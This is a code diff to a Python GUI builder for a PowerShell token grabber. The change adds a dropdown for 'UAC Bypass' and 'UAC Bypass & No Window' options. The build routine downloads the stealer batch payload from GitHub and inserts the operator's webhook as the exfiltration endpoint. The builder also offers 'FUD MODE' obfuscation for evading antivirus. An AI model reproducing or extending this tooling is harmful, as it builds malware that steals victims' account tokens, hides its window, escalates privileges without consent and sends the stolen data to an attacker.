@@ -145,8 +145,10 @@ class Buidler(kdot.CTk):
         self.obfuscation_label.grid(row=1, column=0, sticky="w", padx=5, pady=0)
         self.obfuscate_dropdown_box = kdot.CTkOptionMenu(self.home_frame, values=["Level 1", "Level 2", "Level 3", "All", "FUD MODE", "None"], )
         self.obfuscate_dropdown_box.grid(row=1, column=1, padx=5, pady=5)
-        self.uac_bypass_check_box = kdot.CTkCheckBox(self.home_frame, text="UAC Bypass", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=30, width=60)
-        self.uac_bypass_check_box.grid(row=1, column=2, padx=10, pady=10, sticky="n")
+        
+        self.uac_and_nowindow_box = kdot.CTkOptionMenu(self.home_frame, values=["UAC Bypass", "UAC Bypass & No Window", "None"])
+        self.uac_and_nowindow_box.grid(row=1, column=2, padx=5, pady=5)
+        
         self.build_own_executable_check_box = kdot.CTkCheckBox(self.home_frame, text="Build own exe", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=30, width=60)
         self.build_own_executable_check_box.grid(row=1, column=3, padx=10, pady=10, sticky="e")
         
@@ -240,12 +242,16 @@ class Buidler(kdot.CTk):
     def start_button_event(self):
         # is the code bad? Yes it is. If u wanna fix it and make it look nice thats all u gangy.
         obfuscate = self.obfuscate_dropdown_box.get()
-        uac_bypass = self.uac_bypass_check_box.get()
+        uac_bypass = self.uac_and_nowindow_box.get()
         webhook = self.webhook_box.get()
         build_exe = self.build_own_executable_check_box.get()
         self.url = 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.bat'
-        if uac_bypass == True:
+        if uac_bypass == "None":
+            pass
+        elif uac_bypass == "UAC Bypass":
             self.url = 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main_with_uac_bypass.bat'
+        elif uac_bypass == "UAC Bypass & No Window":
+            self.url = 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main_with_uac_bypass_and_hide_console.bat'
         self.code = requests.get(self.url).text.replace("YOUR_WEBHOOK_HERE", webhook)
         if build_exe == True:
             py_code = 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.py'
